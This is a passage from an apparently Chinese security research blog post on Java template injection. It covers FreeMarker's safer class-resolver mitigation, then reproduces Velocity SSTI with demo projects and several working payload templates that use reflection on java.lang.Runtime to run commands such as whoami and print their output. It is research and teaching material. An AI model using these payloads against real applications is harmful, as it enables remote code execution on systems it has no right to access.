class_">Configuration</span>();<br>cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);<br></code></pre></td></tr></table></figure><p>设置cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);，它会加入一个校验，将freemarker.template.utility.JythonRuntime、freemarker.template.utility.Execute、freemarker.template.utility.ObjectConstructor过滤。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> freemarker.core.TemplateClassResolver;<br><span class="hljs-keyword">import</span> freemarker.template.Configuration;<br><span class="hljs-keyword">import</span> freemarker.template.Template;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileWriter;<br><span class="hljs-keyword">import</span> java.io.Writer;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exec_pcc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.创建配置类</span><br>        <span class="hljs-type">Configuration</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>(Configuration.getVersion());<br>        <span class="hljs-comment">//2.设置模板所在的目录</span><br>        configuration.setDirectoryForTemplateLoading(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/zhenghan/Projects/FreeMarker_test/src/main/resources&quot;</span>));<br>        <span class="hljs-comment">//3.设置字符集</span><br>        configuration.setDefaultEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-comment">//4.加载模板</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> configuration.getTemplate(<span class="hljs-string">&quot;exec_poc1.ftl&quot;</span>);<br><br>        <span class="hljs-comment">// 增加elements安全过滤</span><br>        configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);<br><br>        <span class="hljs-comment">//5.创建数据模型</span><br>        Map map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;张三&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;欢迎来到我的博客！&quot;</span>);<br>        <span class="hljs-comment">//6.创建Writer对象</span><br>        <span class="hljs-type">Writer</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/zhenghan/Projects/FreeMarker_test/src/main/resources/exec_poc1.html&quot;</span>));<br>        <span class="hljs-comment">//7.输出</span><br>        template.process(map, out);<br>        <span class="hljs-comment">//8.关闭Writer对象</span><br>        out.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从 <strong>2.3.17</strong>版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：</p><ol><li><p>UNRESTRICTED_RESOLVER：可以通过 <code>ClassUtil.forName(className)</code> 获取任何类。</p></li><li><p>SAFER_RESOLVER：不能加载 <code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类。</p></li><li><p>ALLOWS_NOTHING_RESOLVER：不能解析任何类。</p></li></ol><p>可通过<code>freemarker.core.Configurable#setNewBuiltinClassResolver</code>方法设置<code>TemplateClassResolver</code>，从而限制通过<code>new()</code>函数对<code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类的解析。</p><h2 id="Velocity-SSTI"><a href="#Velocity-SSTI" class="headerlink" title="Velocity SSTI"></a>Velocity SSTI</h2><p>主要参考：<a href="https://www.cnblogs.com/LittleHann/p/17846825.html#_lab2_0_5">Java模版引擎注入（SSTI）漏洞研究 - 郑瀚 - 博客园 (cnblogs.com)</a></p><p>​  <a href="https://garck3h.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#evaluate%E8%A7%A6%E5%8F%91">velocity的SSTI复现与分析 (garck3h.github.io)</a></p><h3 id="Velocity基本语法"><a href="#Velocity基本语法" class="headerlink" title="Velocity基本语法"></a>Velocity基本语法</h3><p><code>#</code> 关键字<br>Velocity关键字都是使用 <code>#</code>开头的，如 <code>#set</code>、<code>#if</code>、<code>#else</code>、<code>#end</code>、<code>#foreach</code> 等<br><code>$</code>变量<br>Velocity变量都是使用$开头的，如：<code>$name</code>、<code>$msg</code><br><code>&#123;&#125;</code>变量<br>Velocity对于需要明确表示的Velocity变量，可以使用 <code>&#123;&#125;</code> 将变量包含起来。<br><code>！</code>变量<br>如果某个Velocity变量不存在，那么页面中就会显示<code>$xxx</code>的形式，为了避免这种形式，可以在变量名称前加上！。如页面中含有<code>$msg</code>，如果msg有值，将显示msg的值；如果不存在就会显示<code>$msg</code>。这是我们不希望看到的，为了把不存在的变量显示为空白，可以使用<code>$!msg</code>。</p><p>此处的攻击面还是以文件上传和模板编写为主</p><h3 id="Velocity-SSTI漏洞风险面poc"><a href="#Velocity-SSTI漏洞风险面poc" class="headerlink" title="Velocity SSTI漏洞风险面poc"></a>Velocity SSTI漏洞风险面poc</h3><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="web程序中弹出msg"><a href="#web程序中弹出msg" class="headerlink" title="web程序中弹出msg"></a>web程序中弹出msg</h5><p>写一个Demo</p><p>新建一个Maven项目，引入Velocity依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.velocity<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>velocity-engine-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在resource目录下创建模板文件，以.vm后缀命名</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>hello , $&#123;name&#125; !<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.Template;<br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.Velocity;<br><br><span class="hljs-keyword">import</span> java.io.FileWriter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">velocityDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 1、设置velocity资源加载器</span><br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        prop.put(<span class="hljs-string">&quot;file.resource.loader.class&quot;</span>, <span class="hljs-string">&quot;org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader&quot;</span>);<br>        <span class="hljs-comment">// 2、初始化velocity引擎</span><br>        Velocity.init(prop);<br>        <span class="hljs-comment">// 3、创建velocity容器</span><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        <span class="hljs-comment">// 向容器中放入数据</span><br>        context.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;外部输入的消息&quot;</span>);<br>        <span class="hljs-comment">// 4、加载velocity模板</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">tpl</span> <span class="hljs-operator">=</span> Velocity.getTemplate(<span class="hljs-string">&quot;vms/velocityDemo.vm&quot;</span>, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-comment">// 5、合并数据到模板</span><br>        <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;src/main/resources/velocityDemo.html&quot;</span>);<br>        tpl.merge(context, fw);<br>        <span class="hljs-comment">// 6、释放资源</span><br>        fw.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>模板文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    #if($msg)<br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;$!msg&#x27;</span>);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>    #end<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>运行主程序后可以看到模板成功注入，主程序将前台页面的显示写在html文件中，可以看到网页会弹出消息</p><p><img src="/img/ssti(java)/ssti18.png"></p><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><h6 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    #set($e=&quot;e&quot;)<br>$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;Calc&quot;)<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>mac命令为open -a Calculator</p><p>运行主程序后看到成功弹出计算器</p><p><img src="/img/ssti(java)/ssti19.png"></p><h6 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    #set($x=&#x27;&#x27;)##<br>#set($rt = $x.class.forName(&#x27;java.lang.Runtime&#x27;))##<br>#set($chr = $x.class.forName(&#x27;java.lang.Character&#x27;))##<br>#set($str = $x.class.forName(&#x27;java.lang.String&#x27;))##<br>#set($ex=$rt.getRuntime().exec(&#x27;whoami&#x27;))##<br>$ex.waitFor()<br>#set($out=$ex.getInputStream())##<br>#foreach( $i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>注入命令需要网页有回显位，或者将回显数据注入到一个文件中</p><p>如此处构造主程序会合并数据到模板</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;src/main/resources/velocityDemo.html&quot;</span>);<br>tpl.merge(context, fw);<br></code></pre></td></tr></table></figure><p>看到回显</p><p><img src="/img/ssti(java)/ssti20.png"></p><h6 id="poc3"><a href="#poc3" class="headerlink" title="poc3"></a>poc3</h6><p>控制程序中有执行命令语句，编写poc让其执行并输出数据</p><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.Template;<br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.Velocity;<br><br><span class="hljs-keyword">import</span> java.io.FileWriter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Date;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">velocityDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 1、设置velocity资源加载器</span><br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        prop.put(<span class="hljs-string">&quot;file.resource.loader.class&quot;</span>, <span class="hljs-string">&quot;org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader&quot;</span>);<br>        <span class="hljs-comment">// 2、初始化velocity引擎</span><br>        Velocity.init(prop);<br>        <span class="hljs-comment">// 3、创建velocity容器</span><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        <span class="hljs-comment">// 向容器中放入数据</span><br>        context.put(<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>);<br>        <span class="hljs-comment">// 4、加载velocity模板</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">tpl</span> <span class="hljs-operator">=</span> Velocity.getTemplate(<span class="hljs-string">&quot;vms/velocityDemo.vm&quot;</span>, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-comment">// 5、合并数据到模板</span><br>        <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;/Users/zhenghan/Projects/Velocity_test/src/main/resources/velocityDemo.html&quot;</span>);<br>        tpl.merge(context, fw);<br>        <span class="hljs-comment">// 6、释放资源</span><br>        fw.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>模板文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    #set ($e=&quot;exp&quot;)<br>#set ($a=$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($cmd))<br>#set ($input=$e.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))<br>#set($sc = $e.getClass().forName(&quot;java.util.Scanner&quot;))<br>#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName(&quot;java.io.InputStream&quot;)))<br>#set($scan=$constructor.newInstance($input).useDelimiter(&quot;/A&quot;))<br>#if($scan.hasNext())<br>    $scan.next()<br>#end<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>运行主程序后看到回显数据</p><p><img src="/img/ssti(java)/ssti21.png"></p><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="evaluate触发"><a href="#evaluate触发" class="headerlink" title="evaluate触发"></a>evaluate触发</h5><p>evaluate方法使用VelocityEngine的evaluate方法来执行Velocity模板的评估。用户输入通过HttpServletRequest对象获取，并放入VelocityContext中进行渲染。</p><p>接下来简单分析一下velocity存在漏洞的风险代码原理</p><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.Velocity;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">velocityDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;外部攻击者可控输入&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">templateString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello, &quot;</span> + username + <span class="hljs-string">&quot; | Full name: $name, phone: $phone, email: $email&quot;</span>;<br><span class="hljs-comment">//初始化velocity引擎</span><br>        Velocity.init();<br>        <span class="hljs-comment">//创建velocity容器</span><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        <span class="hljs-comment">//向容器中放入数据</span><br>        ctx.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;Little Hann&quot;</span>);<br>        ctx.put(<span class="hljs-string">&quot;phone&quot;</span>, <span class="hljs-string">&quot;123456789&quot;</span>);<br>        ctx.put(<span class="hljs-string">&quot;email&quot;</span>, <span class="hljs-string">&quot;zhenghan.zh@alibaba-inc.com&quot;</span>);<br><br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>        <span class="hljs-comment">// 将模板字符串和上下文对象传递给Velocity引擎进行解析和渲染</span><br>        Velocity.evaluate(ctx, out, <span class="hljs-string">&quot;test&quot;</span>, templateString);<br><br>        <span class="hljs-comment">// 输出velocity渲染结果</span><br>        System.out.println(out.toString());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>模拟注入攻击</p><p>将payload传入username</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.Velocity;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">velocityDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span 